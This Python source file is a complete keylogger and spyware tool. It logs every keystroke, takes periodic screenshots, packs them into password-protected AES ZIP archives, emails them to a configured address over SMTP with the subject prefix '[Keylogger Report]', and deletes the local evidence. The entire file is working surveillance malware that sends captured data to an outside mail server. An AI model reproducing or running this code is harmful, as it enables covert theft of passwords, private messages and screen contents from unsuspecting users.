import os
import time
import logging
import threading
import smtplib
import ssl
import mimetypes
from pathlib import Path
from datetime import datetime, timezone
from email.message import EmailMessage
from pynput import keyboard
import pyautogui
import pyzipper

# ---------- CONFIG ----------
SAVE_DIR = Path(os.environ.get("SAVE_DIR", "monitor_data")).resolve()
SAVE_DIR.mkdir(parents=True, exist_ok=True)

SCREENSHOT_INTERVAL = int(os.environ.get("SCREENSHOT_INTERVAL", "30"))  # seconds
REPORT_INTERVAL = int(os.environ.get("REPORT_INTERVAL", "300"))  # seconds
BATCH_SIZE = int(os.environ.get("BATCH_SIZE", "8"))

ZIP_PASSWORD = os.environ.get("ZIP_PASSWORD", "CHANGE-ME-TO-A-STRONG-PASSWORD")

SMTP_SERVER = os.environ.get("SMTP_SERVER", "smtp.gmail.com")
SMTP_PORT   = int(os.environ.get("SMTP_PORT", "587"))
SMTP_USER   = os.environ.get("SMTP_USER", "")
SMTP_PASS   = os.environ.get("SMTP_PASS", "")
FROM_EMAIL  = os.environ.get("FROM_EMAIL", SMTP_USER)
TO_EMAIL    = os.environ.get("TO_EMAIL", SMTP_USER)

SUBJECT_PREFIX = os.environ.get("SUBJECT_PREFIX", "[Keylogger Report]")
# ----------------------------

# Configure keylogger logging
LOG_FILE = SAVE_DIR / "keys.log"
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.DEBUG,
    format="%(asctime)s: %(message)s"
)

# ---------- KEYLOGGER ----------
def on_press(key):
    try:
        logging.info(f"{key.char}")
    except AttributeError:
        logging.info(f"{key}")

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    print(f"[+] Keylogger started.")
    return listener

# ---------- SCREENSHOT ----------
def capture_screenshots():
    while True:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = SAVE_DIR / f"screenshot_{ts}.png"
        screenshot = pyautogui.screenshot()
        screenshot.save(filename)
        time.sleep(SCREENSHOT_INTERVAL)

# ---------- EMAIL REPORTER ----------
def _chunk(lst, size):
    for i in range(0, len(lst), size):
        yield lst[i:i+size]

def _collect_attachments():
    files = []
    for p in SAVE_DIR.iterdir():
        if p.is_file() and not p.name.endswith(".zip"):
            files.append(p)
    files.sort(key=lambda p: p.stat().st_mtime, reverse=True)
    return files

def _make_encrypted_zip(batch_files, zip_path, password: str):
    with pyzipper.AESZipFile(zip_path, mode="w", compression=pyzipper.ZIP_LZMA) as zf:
        zf.setpassword(password.encode("utf-8"))
        zf.setencryption(pyzipper.WZ_AES, nbits=256)
        for f in batch_files:
            zf.write(f, arcname=f.name)
    return zip_path

def _send_email(subject: str, body: str, file_path: Path):
    msg = EmailMessage()
    msg["From"] = FROM_EMAIL
    msg["To"] = TO_EMAIL
    msg["Subject"] = subject
    msg.set_content(body)

    mime_type, _ = mimetypes.guess_type(str(file_path))
    maintype, subtype = (mime_type.split("/", 1) if mime_type else ("application", "octet-stream"))
    with open(file_path, "rb") as fp:
        msg.add_attachment(fp.read(), maintype=maintype, subtype=subtype, filename=file_path.name)

    context = ssl.create_default_context()
    with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
        server.starttls(context=context)
        server.login(SMTP_USER, SMTP_PASS)
        server.send_message(msg)

def send_report():
    files = _collect_attachments()
    if not files:
        return False

    timestamp = datetime.now(timezone.utc).strftime("%Y%m%d-%H%M%S")
    sent_any = False

    for idx, batch in enumerate(_chunk(files, BATCH_SIZE), start=1):
        zip_name = f"report_{timestamp}_part{idx}.zip"
        zip_path = SAVE_DIR / zip_name

        _make_encrypted_zip(batch, zip_path, ZIP_PASSWORD)

        subject = f"{SUBJECT_PREFIX} {timestamp} (part {idx})"
        body = f"Encrypted report generated at {timestamp} UTC. This ZIP uses AES-256. Keep the password safe."

        _send_email(subject, body, zip_path)
        sent_any = True

        # Clean up originals + sent zip
        for f in batch:
            try: f.unlink(missing_ok=True)
            except: pass
        try: zip_path.unlink(missing_ok=True)
        except: pass

    return sent_any

# ---------- MAIN ----------
def report_loop():
    while True:
        try:
            if send_report():
                print("Report sent.")
        except Exception as e:
            print("Error while sending report:", e)
        time.sleep(REPORT_INTERVAL)

if __name__ == "__main__":
    # Start keylogger
    listener = start_keylogger()

    # Start screenshot thread
    threading.Thread(target=capture_screenshots, daemon=True).start()

    # Start reporting loop
    report_loop()

    listener.join()
